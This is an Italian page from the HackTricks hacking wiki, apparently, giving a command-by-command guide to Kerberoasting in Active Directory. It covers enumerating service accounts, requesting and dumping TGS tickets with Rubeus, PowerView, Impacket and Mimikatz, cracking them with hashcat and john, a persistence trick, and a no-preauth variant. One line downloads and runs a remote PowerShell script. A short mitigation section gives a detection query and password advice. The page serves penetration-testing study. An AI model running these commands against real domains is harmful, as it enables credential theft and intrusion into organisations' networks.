# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kerberoast

Il Kerberoasting si concentra sull'acquisizione di **biglietti TGS**, in particolare quelli relativi ai servizi che operano con **account utente** in **Active Directory (AD)**, escludendo gli **account computer**. La crittografia di questi biglietti utilizza chiavi che derivano dalle **password degli utenti**, consentendo la possibilità di **craccare le credenziali offline**. L'uso di un account utente come servizio è indicato da una proprietà **"ServicePrincipalName"** non vuota.

Per eseguire il **Kerberoasting**, è essenziale un account di dominio in grado di richiedere i **biglietti TGS**; tuttavia, questo processo non richiede **privilegi speciali**, rendendolo accessibile a chiunque abbia **credenziali di dominio valide**.

### Punti chiave:

* Il **Kerberoasting** mira ai **biglietti TGS** per i **servizi con account utente** all'interno di **AD**.
* I biglietti crittografati con chiavi dalle **password degli utenti** possono essere **craccati offline**.
* Un servizio è identificato da un **ServicePrincipalName** che non è nullo.
* Non sono necessari **privilegi speciali**, solo **credenziali di dominio valide**.

### **Attacco**

{% hint style="warning" %}
Gli **strumenti di Kerberoasting** di solito richiedono la **crittografia RC4** durante l'attacco e l'inizializzazione delle richieste TGS-REQ. Ciò è dovuto al fatto che **RC4 è** [**più debole**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) e più facile da craccare offline utilizzando strumenti come Hashcat rispetto ad altri algoritmi di crittografia come AES-128 e AES-256.\
Gli hash RC4 (tipo 23) iniziano con **`$krb5tgs$23$*`** mentre quelli AES-256 (tipo 18) iniziano con **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Strumenti multi-funzionali inclusi un dump degli utenti kerberoastable:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Enumerare gli utenti vulnerabili al Kerberoasting**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Tecnica 1: Richiedere il TGS e scaricarlo dalla memoria**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Tecnica 2: Strumenti automatici**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Quando viene richiesto un TGS, viene generato l'evento di Windows `4769 - È stata richiesta un'autorizzazione di servizio Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) per creare facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunità **più avanzati al mondo**.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistenza

Se hai **abbastanza autorizzazioni** su un utente, puoi **renderlo vulnerabile al kerberoasting**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Puoi trovare **strumenti** utili per gli attacchi **kerberoast** qui: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Se riscontri questo **errore** da Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** è a causa dell'ora locale, è necessario sincronizzare l'host con il DC. Ci sono alcune opzioni:

* `ntpdate <IP del DC>` - Obsoleto da Ubuntu 16.04
* `rdate -n <IP del DC>`

### Mitigazione

Il Kerberoasting può essere condotto con un alto grado di furtività se è sfruttabile. Per rilevare questa attività, è necessario prestare attenzione all'**ID evento di sicurezza 4769**, che indica che è stata richiesta un ticket Kerberos. Tuttavia, a causa dell'alta frequenza di questo evento, è necessario applicare filtri specifici per isolare attività sospette:

* Il nome del servizio non dovrebbe essere **krbtgt**, poiché si tratta di una richiesta normale.
* I nomi dei servizi che terminano con **$** dovrebbero essere esclusi per evitare di includere account macchina utilizzati per i servizi.
* Le richieste dalle macchine dovrebbero essere filtrate escludendo i nomi degli account formattati come **machine@domain**.
* Dovrebbero essere considerate solo le richieste di ticket riuscite, identificate da un codice di errore **'0x0'**.
* **E soprattutto**, il tipo di crittografia del ticket dovrebbe essere **0x17**, che è spesso utilizzato negli attacchi di Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Per mitigare il rischio di Kerberoasting:

* Assicurarsi che le **Password degli Account di Servizio siano difficili da indovinare**, raccomandando una lunghezza di più di **25 caratteri**.
* Utilizzare **Account di Servizio Gestiti**, che offrono vantaggi come **cambi automatici di password** e **gestione delegata del Nome Principale del Servizio (SPN)**, migliorando la sicurezza contro tali attacchi.

Implementando queste misure, le organizzazioni possono ridurre significativamente il rischio associato al Kerberoasting.

## Kerberoast senza account di dominio

A **settembre 2022**, è emerso un nuovo modo per sfruttare un sistema da parte di un ricercatore di nome Charlie Clark, condiviso attraverso la sua piattaforma [exploit.ph](https://exploit.ph/). Questo metodo consente di acquisire i **Service Tickets (ST)** tramite una richiesta **KRB\_AS\_REQ**, che notevolmente non richiede il controllo su alcun account di Active Directory. Fondamentalmente, se un principale è configurato in modo tale da non richiedere la pre-autenticazione - una situazione simile a quanto noto nel campo della sicurezza informatica come un attacco **AS-REP Roasting** - questa caratteristica può essere sfruttata per manipolare il processo di richiesta. In particolare, modificando l'attributo **sname** all'interno del corpo della richiesta, il sistema viene ingannato nel rilasciare un **ST** anziché il normale Ticket Granting Ticket (TGT) crittografato.

La tecnica è completamente spiegata in questo articolo: [post del blog di Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Devi fornire un elenco di utenti poiché non disponiamo di un account valido per interrogare l'LDAP utilizzando questa tecnica.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py da PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus dalla PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Riferimenti

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per costruire e **automatizzare facilmente flussi di lavoro** supportati dagli **strumenti comunitari più avanzati** al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
